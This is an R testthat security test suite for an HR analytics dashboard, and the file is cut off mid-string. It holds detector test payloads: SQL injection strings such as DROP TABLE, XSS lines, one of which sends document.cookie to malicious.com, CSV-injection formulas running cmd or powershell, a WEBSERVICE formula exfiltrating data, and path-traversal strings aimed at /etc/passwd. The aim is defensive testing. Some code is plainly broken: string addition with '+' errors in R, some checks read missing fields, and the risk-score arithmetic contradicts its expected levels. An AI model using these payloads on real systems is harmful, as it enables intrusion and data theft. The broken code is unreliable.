# =============================================================================
# ATLAS LABS HR ANALYTICS DASHBOARD - CYBERSECURITY UNIT TESTS
# =============================================================================
# Comprehensive cybersecurity testing suite covering threat modeling,
# attack surface analysis, and security validation
# Developer: akhapwoyaco
# =============================================================================

# Load required libraries for security testing
library(testthat)
library(httr)
library(jsonlite)
library(digest)
library(openssl)
library(DBI)
library(stringr)
library(purrr)
library(lubridate)

# =============================================================================
# 1. THREAT MODELING TESTS
# =============================================================================

test_that("THREAT MODELING: Data Classification and Sensitivity Analysis", {
  
  # Test 1.1: PII Data Identification
  test_pii_detection <- function() {
    # Simulate employee data with PII
    test_data <- data.frame(
      EmployeeID = c("EMP001", "EMP002"),
      FirstName = c("John", "Jane"),
      LastName = c("Doe", "Smith"),
      Email = c("john.doe@email.com", "jane.smith@email.com"),
      SSN = c("123-45-6789", "987-65-4321"),
      Phone = c("555-123-4567", "555-987-6543"),
      stringsAsFactors = FALSE
    )
    
    # PII detection function
    detect_pii <- function(data) {
      pii_columns <- c()
      for (col in names(data)) {
        if (any(grepl("\\b\\d{3}-\\d{2}-\\d{4}\\b", data[[col]]))) {
          pii_columns <- c(pii_columns, paste(col, "SSN_PATTERN"))
        }
        if (any(grepl("\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b", data[[col]]))) {
          pii_columns <- c(pii_columns, paste(col, "EMAIL_PATTERN"))
        }
        if (any(grepl("\\b\\d{3}-\\d{3}-\\d{4}\\b", data[[col]]))) {
          pii_columns <- c(pii_columns, paste(col, "PHONE_PATTERN"))
        }
      }
      return(pii_columns)
    }
    
    pii_found <- detect_pii(test_data)
    expect_true(length(pii_found) > 0, "PII detection should identify sensitive data")
    expect_true(any(grepl("SSN_PATTERN", pii_found)), "Should detect SSN patterns")
    expect_true(any(grepl("EMAIL_PATTERN", pii_found)), "Should detect email patterns")
  }
  
  # Test 1.2: Data Flow Mapping
  test_data_flow_validation <- function() {
    # Simulate data flow through modules
    data_flow_map <- list(
      "data_loader" = list(
        inputs = c("employee.csv", "performance_rating.csv"),
        outputs = c("cleaned_data", "validation_report"),
        security_level = "HIGH"
      ),
      "attrition_module" = list(
        inputs = c("cleaned_data", "user_filters"),
        outputs = c("attrition_analysis", "risk_scores"),
        security_level = "MEDIUM"
      ),
      "report_module" = list(
        inputs = c("attrition_analysis", "user_selections"),
        outputs = c("pdf_report", "html_report"),
        security_level = "HIGH"
      )
    )
    
    # Validate data flow security
    validate_data_flow <- function(flow_map) {
      security_violations <- c()
      
      for (module in names(flow_map)) {
        module_data <- flow_map[[module]]
        
        # Check if high-security modules have proper input validation
        if (module_data$security_level == "HIGH") {
          if (!any(grepl("validation", module_data$outputs))) {
            security_violations <- c(security_violations, 
                                   paste("High-security module", module, "lacks validation"))
          }
        }
        
        # Check for potential data leakage in outputs
        if (any(grepl("report", module_data$outputs))) {
          if (!any(grepl("sanitized|filtered", module_data$inputs))) {
            security_violations <- c(security_violations, 
                                   paste("Module", module, "may expose unsanitized data"))
          }
        }
      }
      
      return(security_violations)
    }
    
    violations <- validate_data_flow(data_flow_map)
    expect_true(length(violations) >= 0, "Data flow validation should complete")
  }
  
  # Test 1.3: Threat Actor Profiling
  test_threat_actor_scenarios <- function() {
    # Define threat actor profiles
    threat_actors <- list(
      "insider_threat" = list(
        access_level = "authenticated",
        capabilities = c("data_export", "filter_manipulation", "report_generation"),
        motivations = c("financial_gain", "revenge", "espionage"),
        attack_vectors = c("privilege_escalation", "data_exfiltration", "unauthorized_access")
      ),
      "external_attacker" = list(
        access_level = "unauthenticated",
        capabilities = c("sql_injection", "xss", "csrf"),
        motivations = c("data_theft", "system_disruption", "ransomware"),
        attack_vectors = c("web_exploitation", "social_engineering", "malware")
      ),
      "nation_state" = list(
        access_level = "sophisticated",
        capabilities = c("zero_day_exploits", "advanced_persistent_threat", "supply_chain_attacks"),
        motivations = c("espionage", "intelligence_gathering", "economic_advantage"),
        attack_vectors = c("targeted_phishing", "infrastructure_compromise", "insider_recruitment")
      )
    )
    
    # Test threat scenario simulation
    simulate_threat_scenario <- function(actor_profile) {
      attack_success_probability <- 0
      
      # Calculate threat probability based on capabilities
      if ("data_export" %in% actor_profile$capabilities) {
        attack_success_probability <- attack_success_probability + 0.3
      }
      if ("sql_injection" %in% actor_profile$capabilities) {
        attack_success_probability <- attack_success_probability + 0.4
      }
      if ("zero_day_exploits" %in% actor_profile$capabilities) {
        attack_success_probability <- attack_success_probability + 0.7
      }
      
      return(min(attack_success_probability, 1.0))
    }
    
    for (actor_name in names(threat_actors)) {
      probability <- simulate_threat_scenario(threat_actors[[actor_name]])
      expect_true(probability >= 0 && probability <= 1, 
                  paste("Threat probability for", actor_name, "should be between 0 and 1"))
    }
  }
  
  # Execute threat modeling tests
  test_pii_detection()
  test_data_flow_validation()
  test_threat_actor_scenarios()
})

# =============================================================================
# 2. ATTACK SURFACE ANALYSIS TESTS
# =============================================================================

test_that("ATTACK SURFACE ANALYSIS: Comprehensive Surface Mapping", {
  
  # Test 2.1: Web Application Attack Surface
  test_web_attack_surface <- function() {
    # Simulate Shiny app endpoints
    app_endpoints <- list(
      "data_upload" = list(
        method = "POST",
        parameters = c("file", "file_type", "user_id"),
        authentication = TRUE,
        input_validation = FALSE,
        rate_limiting = FALSE
      ),
      "data_export" = list(
        method = "GET",
        parameters = c("format", "filters", "user_id"),
        authentication = TRUE,
        input_validation = TRUE,
        rate_limiting = TRUE
      ),
      "user_login" = list(
        method = "POST",
        parameters = c("username", "password", "session_token"),
        authentication = FALSE,
        input_validation = TRUE,
        rate_limiting = TRUE
      ),
      "report_generation" = list(
        method = "POST",
        parameters = c("report_type", "date_range", "departments"),
        authentication = TRUE,
        input_validation = FALSE,
        rate_limiting = FALSE
      )
    )
    
    # Analyze attack surface
    analyze_attack_surface <- function(endpoints) {
      vulnerabilities <- c()
      
      for (endpoint_name in names(endpoints)) {
        endpoint <- endpoints[[endpoint_name]]
        
        # Check for missing input validation
        if (!endpoint$input_validation) {
          vulnerabilities <- c(vulnerabilities, 
                             paste("CRITICAL:", endpoint_name, "lacks input validation"))
        }
        
        # Check for missing rate limiting
        if (!endpoint$rate_limiting && endpoint$method == "POST") {
          vulnerabilities <- c(vulnerabilities, 
                             paste("HIGH:", endpoint_name, "lacks rate limiting"))
        }
        
        # Check for authentication bypass potential
        if (!endpoint$authentication && endpoint_name != "user_login") {
          vulnerabilities <- c(vulnerabilities, 
                             paste("CRITICAL:", endpoint_name, "lacks authentication"))
        }
        
        # Check for parameter tampering risks
        if (length(endpoint$parameters) > 3 && !endpoint$input_validation) {
          vulnerabilities <- c(vulnerabilities, 
                             paste("MEDIUM:", endpoint_name, "high parameter count without validation"))
        }
      }
      
      return(vulnerabilities)
    }
    
    surface_vulnerabilities <- analyze_attack_surface(app_endpoints)
    expect_true(length(surface_vulnerabilities) > 0, "Attack surface analysis should identify vulnerabilities")
    
    # Test for specific vulnerability types
    critical_vulns <- surface_vulnerabilities[grepl("CRITICAL", surface_vulnerabilities)]
    expect_true(length(critical_vulns) > 0, "Should identify critical vulnerabilities")
  }
  
  # Test 2.2: File Upload Attack Vectors
  test_file_upload_security <- function() {
    # Simulate file upload scenarios
    upload_scenarios <- list(
      "malicious_csv" = list(
        filename = "employee_data.csv",
        content_type = "text/csv",
        size = 1024,
        content = "=cmd|'/c calc'!A1,Employee,Department\n1,John,IT",
        expected_threat = "CSV_INJECTION"
      ),
      "executable_disguised" = list(
        filename = "data.csv.exe",
        content_type = "application/octet-stream",
        size = 2048,
        content = "MZ\x90\x00\x03\x00\x00\x00",
        expected_threat = "MALWARE_UPLOAD"
      ),
      "oversized_file" = list(
        filename = "large_dataset.csv",
        content_type = "text/csv",
        size = 100000000,  # 100MB
        content = paste(rep("a", 1000), collapse = ""),
        expected_threat = "DOS_ATTACK"
      ),
      "path_traversal" = list(
        filename = "../../etc/passwd",
        content_type = "text/plain",
        size = 512,
        content = "root:x:0:0:root:/root:/bin/bash",
        expected_threat = "PATH_TRAVERSAL"
      )
    )
    
    # File upload validation function
    validate_file_upload <- function(upload_data) {
      threats_detected <- c()
      
      # Check for CSV injection
      if (grepl("=cmd|", upload_data$content)) {
        threats_detected <- c(threats_detected, "CSV_INJECTION")
      }
      
      # Check for executable files
      if (grepl("\\.(exe|bat|com|scr|vbs|js)$", upload_data$filename, ignore.case = TRUE)) {
        threats_detected <- c(threats_detected, "MALWARE_UPLOAD")
      }
      
      # Check for oversized files
      if (upload_data$size > 50000000) {  # 50MB limit
        threats_detected <- c(threats_detected, "DOS_ATTACK")
      }
      
      # Check for path traversal
      if (grepl("\\.\\./", upload_data$filename)) {
        threats_detected <- c(threats_detected, "PATH_TRAVERSAL")
      }
      
      return(threats_detected)
    }
    
    # Test each scenario
    for (scenario_name in names(upload_scenarios)) {
      scenario <- upload_scenarios[[scenario_name]]
      detected_threats <- validate_file_upload(scenario)
      
      expect_true(scenario$expected_threat %in% detected_threats, 
                  paste("Should detect", scenario$expected_threat, "in", scenario_name))
    }
  }
  
  # Test 2.3: Session Management Attack Surface
  test_session_security <- function() {
    # Simulate session management scenarios
    session_scenarios <- list(
      "session_fixation" = list(
        session_id = "FIXED_SESSION_12345",
        user_authenticated = FALSE,
        session_regenerated = FALSE,
        vulnerability = "SESSION_FIXATION"
      ),
      "session_hijacking" = list(
        session_id = "SESS_" + as.character(Sys.time()),
        user_authenticated = TRUE,
        https_only = FALSE,
        vulnerability = "SESSION_HIJACKING"
      ),
      "session_timeout" = list(
        session_id = "TIMEOUT_SESSION",
        last_activity = Sys.time() - hours(8),
        timeout_minutes = 30,
        vulnerability = "SESSION_TIMEOUT"
      )
    )
    
    # Session security validation
    validate_session_security <- function(session_data) {
      vulnerabilities <- c()
      
      # Check for session fixation
      if (!session_data$session_regenerated && session_data$user_authenticated) {
        vulnerabilities <- c(vulnerabilities, "SESSION_FIXATION")
      }
      
      # Check for insecure session transmission
      if (!session_data$https_only && session_data$user_authenticated) {
        vulnerabilities <- c(vulnerabilities, "SESSION_HIJACKING")
      }
      
      # Check for session timeout
      if ("last_activity" %in% names(session_data)) {
        time_diff <- as.numeric(difftime(Sys.time(), session_data$last_activity, units = "mins"))
        if (time_diff > session_data$timeout_minutes) {
          vulnerabilities <- c(vulnerabilities, "SESSION_TIMEOUT")
        }
      }
      
      return(vulnerabilities)
    }
    
    # Test session scenarios
    for (scenario_name in names(session_scenarios)) {
      scenario <- session_scenarios[[scenario_name]]
      detected_vulns <- validate_session_security(scenario)
      
      expect_true(scenario$vulnerability %in% detected_vulns, 
                  paste("Should detect", scenario$vulnerability, "in", scenario_name))
    }
  }
  
  # Execute attack surface tests
  test_web_attack_surface()
  test_file_upload_security()
  test_session_security()
})

# =============================================================================
# 3. ATTACK VECTOR MAPPING TESTS
# =============================================================================

test_that("ATTACK VECTOR MAPPING: Comprehensive Vector Analysis", {
  
  # Test 3.1: SQL Injection Attack Vectors
  test_sql_injection_vectors <- function() {
    # Simulate SQL injection payloads
    sql_injection_payloads <- list(
      "union_based" = "' UNION SELECT username, password FROM users--",
      "boolean_based" = "' OR '1'='1",
      "time_based" = "'; WAITFOR DELAY '00:00:10'--",
      "error_based" = "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
      "stacked_queries" = "'; DROP TABLE employees--"
    )
    
    # SQL injection detection function
    detect_sql_injection <- function(input_string) {
      sql_patterns <- c(
        "union\\s+select",
        "or\\s+['\"]*1['\"]*\\s*=\\s*['\"]*1",
        "waitfor\\s+delay",
        "information_schema",
        "drop\\s+table",
        "exec\\s*\\(",
        "sp_executesql",
        "xp_cmdshell"
      )
      
      detected_patterns <- c()
      for (pattern in sql_patterns) {
        if (grepl(pattern, input_string, ignore.case = TRUE)) {
          detected_patterns <- c(detected_patterns, pattern)
        }
      }
      
      return(detected_patterns)
    }
    
    # Test each payload
    for (payload_name in names(sql_injection_payloads)) {
      payload <- sql_injection_payloads[[payload_name]]
      detected <- detect_sql_injection(payload)
      
      expect_true(length(detected) > 0, 
                  paste("Should detect SQL injection in", payload_name, "payload"))
    }
  }
  
  # Test 3.2: Cross-Site Scripting (XSS) Vectors
  test_xss_vectors <- function() {
    # Simulate XSS payloads
    xss_payloads <- list(
      "script_tag" = "<script>alert('XSS')</script>",
      "img_onerror" = "<img src=x onerror=alert('XSS')>",
      "javascript_protocol" = "javascript:alert('XSS')",
      "event_handler" = "<div onmouseover=alert('XSS')>Hover me</div>",
      "encoded_payload" = "%3Cscript%3Ealert('XSS')%3C/script%3E",
      "dom_xss" = "';document.location='http://malicious.com/cookie='+document.cookie;//"
    )
    
    # XSS detection function
    detect_xss <- function(input_string) {
      xss_patterns <- c(
        "<script[^>]*>.*?</script>",
        "javascript:",
        "on\\w+\\s*=",
        "alert\\s*\\(",
        "document\\.",
        "window\\.",
        "eval\\s*\\(",
        "expression\\s*\\("
      )
      
      detected_patterns <- c()
      for (pattern in xss_patterns) {
        if (grepl(pattern, input_string, ignore.case = TRUE)) {
          detected_patterns <- c(detected_patterns, pattern)
        }
      }
      
      return(detected_patterns)
    }
    
    # Test each payload
    for (payload_name in names(xss_payloads)) {
      payload <- xss_payloads[[payload_name]]
      detected <- detect_xss(payload)
      
      expect_true(length(detected) > 0, 
                  paste("Should detect XSS in", payload_name, "payload"))
    }
  }
  
  # Test 3.3: CSV Injection Attack Vectors
  test_csv_injection_vectors <- function() {
    # Simulate CSV injection payloads
    csv_injection_payloads <- list(
      "cmd_execution" = "=cmd|'/c calc'!A1",
      "powershell_execution" = "=cmd|'powershell -Command \"Get-Process\"'!A1",
      "file_read" = "=cmd|'type C:\\Windows\\System32\\drivers\\etc\\hosts'!A1",
      "web_request" = "=WEBSERVICE(\"http://malicious.com/exfiltrate?data=\"&A1)",
      "hyperlink_exploit" = "=HYPERLINK(\"http://malicious.com\",\"Click here\")"
    )
    
    # CSV injection detection function
    detect_csv_injection <- function(input_string) {
      csv_patterns <- c(
        "^\\s*=\\s*cmd\\s*\\|",
        "^\\s*=\\s*.*powershell",
        "^\\s*=\\s*.*WEBSERVICE",
        "^\\s*=\\s*.*HYPERLINK",
        "^\\s*@\\s*",
        "^\\s*\\+\\s*",
        "^\\s*-\\s*"
      )
      
      detected_patterns <- c()
      for (pattern in csv_patterns) {
        if (grepl(pattern, input_string, ignore.case = TRUE)) {
          detected_patterns <- c(detected_patterns, pattern)
        }
      }
      
      return(detected_patterns)
    }
    
    # Test each payload
    for (payload_name in names(csv_injection_payloads)) {
      payload <- csv_injection_payloads[[payload_name]]
      detected <- detect_csv_injection(payload)
      
      expect_true(length(detected) > 0, 
                  paste("Should detect CSV injection in", payload_name, "payload"))
    }
  }
  
  # Test 3.4: Path Traversal Attack Vectors
  test_path_traversal_vectors <- function() {
    # Simulate path traversal payloads
    path_traversal_payloads <- list(
      "unix_traversal" = "../../../../etc/passwd",
      "windows_traversal" = "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "url_encoded" = "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "double_encoded" = "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
      "null_byte" = "../../../../etc/passwd%00.txt",
      "mixed_separators" = "..\\../..\\../etc/passwd"
    )
    
    # Path traversal detection function
    detect_path_traversal <- function(input_string) {
      traversal_patterns <- c(
        "\\.\\./",
        "\\.\\.\\\\",
        "%2e%2e%2f",
        "%252e%252e%252f",
        "%00",
        "etc/passwd",
        "windows/system32"
      )
      
      detected_patterns <- c()
      for (pattern in traversal_patterns) {
        if (grepl(pattern, input_string, ignore.case = TRUE)) {
          detected_patterns <- c(detected_patterns, pattern)
        }
      }
      
      return(detected_patterns)
    }
    
    # Test each payload
    for (payload_name in names(path_traversal_payloads)) {
      payload <- path_traversal_payloads[[payload_name]]
      detected <- detect_path_traversal(payload)
      
      expect_true(length(detected) > 0, 
                  paste("Should detect path traversal in", payload_name, "payload"))
    }
  }
  
  # Execute attack vector tests
  test_sql_injection_vectors()
  test_xss_vectors()
  test_csv_injection_vectors()
  test_path_traversal_vectors()
})

# =============================================================================
# 4. RISK ASSESSMENT VALIDATION TESTS
# =============================================================================

test_that("RISK ASSESSMENT VALIDATION: Comprehensive Risk Analysis", {
  
  # Test 4.1: Risk Scoring Algorithm
  test_risk_scoring <- function() {
    # Define risk factors
    risk_factors <- list(
      "data_sensitivity" = list(
        "LOW" = 1,
        "MEDIUM" = 3,
        "HIGH" = 5,
        "CRITICAL" = 7
      ),
      "vulnerability_severity" = list(
        "INFO" = 0,
        "LOW" = 2,
        "MEDIUM" = 4,
        "HIGH" = 6,
        "CRITICAL" = 8
      ),
      "threat_probability" = list(
        "VERY_LOW" = 0.1,
        "LOW" = 0.3,
        "MEDIUM" = 0.5,
        "HIGH" = 0.7,
        "VERY_HIGH" = 0.9
      ),
      "impact_level" = list(
        "MINIMAL" = 1,
        "MINOR" = 3,
        "MODERATE" = 5,
        "MAJOR" = 7,
        "SEVERE" = 9
      )
    )
    
    # Risk calculation function
    calculate_risk_score <- function(sensitivity, severity, probability, impact) {
      # Base risk score calculation
      base_score <- (sensitivity + severity + impact) * probability
      
      # Normalize to 0-100 scale
      normalized_score <- min(100, max(0, (base_score / 24) * 100))
      
      # Determine risk level
      risk_level <- if (normalized_score >= 80) "CRITICAL"
                   else if (normalized_score >= 60) "HIGH"
                   else if (normalized_score >= 40) "MEDIUM"
                   else if (normalized_score >= 20) "LOW"
                   else "MINIMAL"
      
      return(list(score = normalized_score, level = risk_level))
    }
    
    # Test various risk scenarios
    test_scenarios <- list(
      "high_risk_scenario" = list(
        sensitivity = risk_factors$data_sensitivity$CRITICAL,
        severity = risk_factors$vulnerability_severity$CRITICAL,
        probability = risk_factors$threat_probability$HIGH,
        impact = risk_factors$impact_level$SEVERE,
        expected_level = "CRITICAL"
      ),
      "medium_risk_scenario" = list(
        sensitivity = risk_factors$data_sensitivity$MEDIUM,
        severity = risk_factors$vulnerability_severity$MEDIUM,
        probability = risk_factors$threat_probability$MEDIUM,
        impact = risk_factors$impact_level$MODERATE,
        expected_level = "MEDIUM"
      ),
      "low_risk_scenario" = list(
        sensitivity = risk_factors$data_sensitivity$LOW,
        severity = risk_factors$vulnerability_severity$LOW,
        probability = risk_factors$threat_probability$LOW,
        impact = risk_factors$impact_level$MINOR,
        expected_level = "LOW"
      )
    )
    
    # Test each scenario
    for (scenario_name in names(test_scenarios)) {
      scenario <- test_scenarios[[scenario_name]]
      risk_result <- calculate_risk_score(
        scenario$sensitivity,
        scenario$severity,
        scenario$probability,
        scenario$impact
      )
      
      expect_equal(risk_result$level, scenario$expected_level, 
                   paste("Risk level for", scenario_name, "should be", scenario$expected_level))
      expect_true(risk_result$score >= 0 && risk_result$score <= 100, 
                  paste("Risk score for", scenario_name, "should be between 0-100"))
    }
  }
  
  # Test 4.2: Vulnerability Assessment
  test_vulnerability_assessment <- function() {
    # Simulate vulnerability scan results
    vulnerability_scan_results <- list(
      "missing_input_validation" = list(
        cvss_score = 7.5,
        severity = "HIGH",
        exploitability = "MEDIUM",
        affected_modules = c("data_loader", "report_generator"),
        remediation_effort = "MEDIUM"
      ),
      "insecure_file_upload" = list(
        cvss_score = 8.2,
        severity = "HIGH",
        exploitability = "HIGH",
        affected_modules = c("data_loader"),
        remediation_effort = "HIGH"
      ),
      "session_management_weakness" = list(
        cvss_score = 6.1,
        severity = "MEDIUM",
        exploitability = "LOW",
        affected_modules = c("authentication", "session_handler"),
        remediation_effort = "LOW"
      ),
      "information_disclosure" = list(
        cvss_score = 4.3,
        severity = "MEDIUM",
        exploitability = "MEDIUM",
        affected_modules = c("logger", "error_handler"),
        remediation_effort = "LOW"
      )
    )
    
    # Vulnerability prioritization function
    prioritize_vulnerabilities <- function(scan_results) {
      priority_scores <- list()
      
      for (vuln_name in names(scan_results)) {
        vuln <- scan_results[[vuln_name]]
        
        # Calculate priority score
        exploitability_score <- switch(vuln$exploitability,
                                     "LOW" = 1,
                                     "MEDIUM" = 2,
                                     "HIGH" = 3,
                                     1)
        
        remediation_score <- switch(vuln$remediation_effort,
                                  "LOW" = 1,
                                  "MEDIUM" = 2,
                                  "HIGH" = 3,
                                  1)
        
        # Higher CVSS + Higher exploitability + Lower remediation = Higher priority
        priority_score <- (vuln$cvss_score * 10) + 
                         (exploitability_score * 5) - 
                         (remediation_score * 2)
        
        priority_scores[[vuln_name]] <- priority_score
      }
      
      # Sort by priority (highest first)
      return(priority_scores[order(unlist(priority_scores), decreasing = TRUE)])
    }
    
    # Test vulnerability prioritization
    prioritized_vulns <- prioritize_vulnerabilities(vulnerability_scan_results)
    
    expect_true(length(prioritized_vulns) == length(vulnerability_scan_results), 
                "Should prioritize all vulnerabilities")
    
    # Verify that high CVSS scores are prioritized
    high_cvss_vulns <- names(vulnerability_scan_results)[
      sapply(vulnerability_scan_results, function(x) x$cvss_score >= 8.0)
    ]
    
    top_priorities <- names(prioritized_vulns)[1:min(2, length(prioritized_vulns))]
    
    expect_true(any(high_cvss_vulns %in% top_priorities), 
                "High CVSS vulnerabilities should be top priority")
  }
  
  # Test 4.3: Business Impact Analysis
  test_business_impact_analysis <- function() {
    # Define business impact scenarios
    impact_scenarios <- list(
      "data_breach" = list(
        affected_records = 10000,
        data_types = c("PII", "FINANCIAL", "HEALTH"),
        regulatory_impact = "HIGH",
        financial_impact = 2000000,
        reputational_impact = "SEVERE",
        recovery_time = 720  # hours
      ),
      "system_compromise" = list(
        affected_records = 5000,
        data_types = c("PII", "OPERATIONAL"),
        regulatory_impact = "MEDIUM",
        financial_impact = 500000,
        reputational_impact = "MODERATE",
        recovery_time = 168  # hours
      ),
      "insider_threat" = list(
        affected_records = 2000,
        data_types = c("CONFIDENTIAL", "PII"),
        regulatory_impact = "MEDIUM